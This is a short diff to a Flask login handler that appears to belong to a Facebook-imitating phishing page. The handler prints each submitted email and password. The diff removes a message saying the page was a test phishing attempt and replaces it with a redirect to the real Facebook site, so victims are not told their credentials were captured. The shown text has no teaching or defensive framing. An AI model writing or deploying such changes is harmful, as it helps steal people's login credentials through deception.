@@ -92,7 +92,7 @@ def login():
     email = request.form.get('email')
     password = request.form.get('password')
     print(f"[+] Email: {email}, Password: {password}")
-    return "Login failed! This was a test phishing attempt."  # Don't redirect to real Facebook
+    return redirect("https://www.facebook.com")
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
